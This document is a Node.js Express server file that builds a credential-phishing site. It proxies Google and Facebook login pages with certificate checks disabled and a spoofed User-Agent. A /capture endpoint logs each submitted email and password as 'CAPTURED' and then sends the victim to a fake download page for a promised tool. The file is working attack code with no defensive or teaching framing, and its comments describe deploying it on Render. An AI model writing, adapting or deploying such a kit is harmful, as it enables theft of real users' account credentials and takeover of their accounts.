const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const app = express();

const PORT = process.env.PORT || 3000;

// Serve static files
app.use(express.static(__dirname));

// Google proxy - modified to work on Render
app.use('/auth/google', createProxyMiddleware({
    target: 'https://accounts.google.com',
    changeOrigin: true,
    secure: false,
    followRedirects: true,
    logLevel: 'error',
    headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
}));

// Facebook proxy
app.use('/auth/facebook', createProxyMiddleware({
    target: 'https://www.facebook.com',
    changeOrigin: true,
    secure: false,
    followRedirects: true,
    logLevel: 'error',
    headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
}));

// Capture endpoint (simplified for Render)
app.post('/capture/:provider', express.urlencoded({ extended: true }), (req, res) => {
    const { provider } = req.params;
    const { email, pass, password, tool } = req.body;
    const actualPass = pass || password;
    
    console.log(`✅ CAPTURED: ${email}:${actualPass} (${provider}) for ${tool}`);
    
    // Redirect to download page
    res.redirect(`/download?tool=${tool}`);
});

// Download page
app.get('/download', (req, res) => {
    const tool = req.query.tool || 'tool';
    res.send(`
    <!DOCTYPE html>
    <html>
    <head><title>Download</title></head>
    <body>
        <h1>Download ready for ${tool}</h1>
        <p>Your file will start downloading...</p>
    </body>
    </html>
    `);
});

// Health check (Render likes this)
app.get('/health', (req, res) => {
    res.status(200).send('OK');
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Proxy running on port ${PORT}`);
});
